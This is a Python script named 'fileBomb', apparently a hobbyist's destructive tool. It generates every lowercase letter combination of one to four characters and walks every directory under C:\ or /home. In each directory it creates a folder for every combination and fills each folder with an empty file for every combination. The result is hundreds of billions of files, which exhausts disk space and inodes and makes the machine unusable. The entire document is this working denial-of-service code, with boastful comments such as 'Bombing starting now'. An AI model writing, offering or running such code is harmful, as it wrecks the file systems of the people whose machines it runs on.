import os
from subprocess import check_output
def getCombinations(characters="abc",length=3,combList=None,substr=""):
    if combList==None:
        combList=[]
        if len(characters)<length:
            print("Error!!!The lenght of characters mush be larger than the length of a combination!!!")
            return combList
    if len(substr)==length:
        combList.append(substr)
        return
    for character in characters:
        newsub=substr+character
        getCombinations(characters,length,combList,newsub)
    return combList
def getCombinationsRange(characters="abc",startLength=1,finalLength=3,combList=None):
    if combList==None:
        combList=[]
    for length in range(startLength,finalLength+1):
        combList=getCombinations(characters,length,combList)
    return combList
print("______________fileBomb__________________________")#changeThis,jk lol the name is cool actually
print("\n")
print("fileBomb is generating combinations...please wait...")
print("\n")
combinations=getCombinationsRange("qwertyuiopasdfghjklzxcvbnm",1,4) #this really can be changed
question1=r"SELECT [1=WINDOWS  2=LINUX] :    "
print("\n")
response1=input(question1)
print("\n")
path1=""
getContentCommand=""
if(response1=="1"):
	path1=r"C:\ "
	getContentCommand="dir /S /B"
elif (response1=="2"):
	path1="/home"
	getContentCommand="find *"
else:
	print(f"Error!!!\t{response1} is not a valid option.")
	print("\n")
os.chdir(path1)
print("\n")
print("______Bombing starting now...______(in fact it already started)_____")
print("\n")
try:
	content=check_output(getContentCommand,shell=True,text=True)
except Exception as e:
	print(f"!!!Error:\t{e}")
	print("\n")
directories=[]
directories.append(path1)
try:
	for line in content.splitlines():
		directories.append(line)
except Exception as e:
	print(f"!!!Error:\t{e}")
	print("\n")
for directory in directories:
	try:
		os.chdir(directory)
		for folder in combinations:
			os.makedirs(folder,exist_ok=True)
			for file in combinations:
				newPath=os.path.join(folder,file)
				file=open(newPath,"w")
				print(f"file : {newPath}\t successfully created.")
	except Exception as e:
		print(f"!!!Error:\t{e}")

